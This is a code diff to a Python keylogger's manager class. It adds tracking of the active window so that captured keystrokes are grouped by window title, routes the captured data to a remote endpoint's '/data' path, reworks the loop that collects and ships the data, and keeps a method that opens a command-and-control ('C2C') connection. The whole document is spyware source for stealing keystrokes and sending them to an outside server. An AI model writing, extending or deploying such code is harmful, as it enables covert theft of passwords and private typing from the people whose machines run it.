@@ -11,6 +11,7 @@ from keylogger.sinker import Sinker
 from keylogger.processor import Processor
 from keylogger.listner import LinuxKeylogger, WindowsKeylogger, Listener
 from keylogger.system_info import get_system_info
+from keylogger.active_window import WindowTracker
 
 logger = logging.getLogger(__name__)
 
@@ -54,8 +55,14 @@ class DefaultManager:
         # Use WindowsKeylogger if the OS is Windows, otherwise use LinuxKeylogger
         if os.name == "vnt":
             keylogger = WindowsKeylogger()
+            self.window_tracker = None
         else:
             keylogger = LinuxKeylogger()
+            # Start a new sequence when the active window changes
+            self.window_tracker = WindowTracker(
+                # use lambda to call the start_new_sequence method with the window title
+                lambda w: keylogger.start_new_sequence(w.title)
+            )
 
         self.processor = Processor("")
         self.endpoint = endpoint
@@ -65,7 +72,7 @@ class DefaultManager:
         if log_path:
             self.sink.append(FileWriter(log_path))
         if self.endpoint:
-            self.sink.append(NetworkWriter(self.endpoint))
+            self.sink.append(NetworkWriter(self.endpoint + "/data"))
 
         self.listner = keylogger
         self.interval = push_interval
@@ -75,15 +82,18 @@ class DefaultManager:
 
     def start(self) -> None:
         self.listner.start()
+        self.window_tracker.start()
         self._loop_thread.start()
         self._stopped = False
         self._c2c_init()
 
     def stop(self) -> None:
         logger.debug("Stopping the manager")
-        self.listner.stop()
-
         self._stopped = True
+
+        self.listner.stop()
+        self.window_tracker.stop()
+
         if self._loop_thread and self._loop_thread.is_alive():
             self._loop_thread.join()
 
@@ -111,14 +121,22 @@ class DefaultManager:
             self.stop()
 
     def _loop(self):
-        # the loop that gets the data from the listener, processes it, and then sinks it.
+        elpased = 0
+
+        # Run the loop until the manager is stopped
         while not self._stopped:
-            data = self.listner.get_data()
-            if data:
-                processed_data = self.processor.process_data(data)
-                for sink in self.sink:
-                    sink.sink(processed_data)
-            time.sleep(self.interval)
+            # If the interval has passed, get the data from the listener,
+            # process it, and then sink it.
+            if elpased >= self.interval:
+                data = self.listner.get_data()
+                for d in data:
+                    processed_data = self.processor.process_data(d)
+                    for sink in self.sink:
+                        sink.sink(processed_data)
+                elpased = 0
+
+            time.sleep(1)
+            elpased += 1
 
     def _c2c_init(self):
         # Initialize the connection to the C2C server
